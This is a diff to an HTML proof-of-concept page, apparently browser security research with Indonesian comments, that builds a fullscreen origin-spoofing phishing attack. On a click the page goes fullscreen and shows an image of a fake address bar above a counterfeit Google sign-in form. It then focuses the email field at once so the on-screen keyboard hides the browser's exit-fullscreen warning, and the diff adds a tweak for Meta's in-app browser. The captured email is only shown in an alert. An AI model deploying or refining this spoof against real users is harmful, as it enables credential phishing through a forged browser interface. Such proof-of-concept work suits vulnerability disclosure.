@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Security UI Research</title>
+    <title>Security UI Research - Fullscreen Origin Spoof</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
 
-        /* Layar pemicu awal */
+        /* Layar pemicu (Langkah 1) */
         #trigger-zone {
             display: flex;
             justify-content: center;
@@ -17,20 +17,22 @@
             cursor: pointer;
         }
 
-        /* Container utama yang muncul setelah fullscreen */
+        /* Container utama setelah masuk fullscreen (Langkah 2) */
         #spoof-container {
             display: none;
             width: 100vw;
             height: 100vh;
             background: white;
             flex-direction: column;
+            position: relative;
         }
 
-        /* Omnibox Palsu (spoof.jpeg) */
+        /* Omnibox Palsu (spoof.jpeg) diletakkan paling atas */
         #fake-omnibox {
             width: 100%;
             height: auto;
             display: block;
+            z-index: 9999;
             border-bottom: 1px solid #e0e0e0;
         }
 
@@ -40,14 +42,14 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding-top: 50px;
+            padding-top: 40px;
             background: #ffffff;
         }
 
         .login-box {
-            width: 350px;
+            width: 90%;
+            max-width: 350px;
             text-align: center;
-            padding: 20px;
         }
 
         input[type="email"] {
@@ -57,6 +59,7 @@
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
+            box-sizing: border-box;
         }
 
         .btn-next {
@@ -76,53 +79,63 @@
     <div id="trigger-zone">
         <div style="text-align: center;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
-            <h2 style="color: #5f6368;">Sign in to continue</h2>
-            <button style="padding: 10px 20px; border: 1px solid #dadce0; background: white; border-radius: 4px;">Click to Login</button>
+            <h2 style="color: #5f6368;">Masuk untuk melanjutkan</h2>
+            <button style="padding: 12px 24px; border: 1px solid #dadce0; background: white; border-radius: 4px; font-size: 16px;">Login</button>
         </div>
     </div>
 
     <div id="spoof-container">
-        <img id="fake-omnibox" src="spoof.jpeg" alt="Browser UI">
+        <img id="fake-omnibox" src="spoof.jpeg" alt="Omnibox">
 
         <div id="login-frame">
             <div class="login-box">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
-                <h1 style="font-size: 24px; margin-top: 10px;">Sign in</h1>
-                <p>Use your Google Account</p>
+                <h1 style="font-size: 24px; margin-top: 10px;">Login</h1>
+                <p>Gunakan Akun Google Anda</p>
 
-                <input type="email" placeholder="Email or phone" id="fake_email">
+                <input type="email" placeholder="Email atau ponsel" id="fake_email" autocomplete="off">
 
                 <div style="width: 100%; margin-top: 30px;">
-                    <span style="color: #1a73e8; font-weight: 500; float: left; margin-top: 10px; cursor: pointer;">Forgot email?</span>
-                    <button class="btn-next" onclick="alert('Data Captured: ' + document.getElementById('fake_email').value)">Next</button>
+                    <span style="color: #1a73e8; font-weight: 500; float: left; margin-top: 10px; cursor: pointer;">Lupa email?</span>
+                    <button class="btn-next" onclick="alert('Email tersadap: ' + document.getElementById('fake_email').value)">Berikutnya</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        document.getElementById('trigger-zone').onclick = async () => {
+        const triggerZone = document.getElementById('trigger-zone');
+        const spoofContainer = document.getElementById('spoof-container');
+        const inputEmail = document.getElementById('fake_email');
+
+        triggerZone.onclick = async () => {
             try {
-                // 1. Masuk Fullscreen
+                // 1. Memicu Fullscreen
                 if (document.documentElement.requestFullscreen) {
                     await document.documentElement.requestFullscreen();
                 } else if (document.documentElement.webkitRequestFullscreen) {
                     await document.documentElement.webkitRequestFullscreen();
                 }
 
-                // 2. Ganti UI ke mode spoofing
-                document.getElementById('trigger-zone').style.display = 'none';
-                document.getElementById('spoof-container').style.display = 'flex';
+                // 2. Transisi UI
+                triggerZone.style.display = 'none';
+                spoofContainer.style.display = 'flex';
 
-                // 3. Race Condition: Picu Keyboard secara instan
-                // Ini akan menutupi instruksi sistem "Cara keluar"
-                const inputEmail = document.getElementById('fake_email');
+                // 3. Race Condition: Fokus ke input untuk memicu keyboard
+                // Di Chrome ini akan otomatis, di Meta IAB mungkin butuh interaksi tambahan (seperti klik pada input)
                 inputEmail.focus();
 
             } catch (err) {
-                console.error("Error:", err);
+                console.error("Gagal masuk mode fullscreen:", err);
             }
         };
+
+        // Tambahan untuk Meta IAB: Pastikan keyboard muncul saat area konten disentuh
+        spoofContainer.addEventListener('touchstart', function() {
+            if (document.activeElement !== inputEmail) {
+                inputEmail.focus();
+            }
+        });
     </script>
 </body>
 </html>
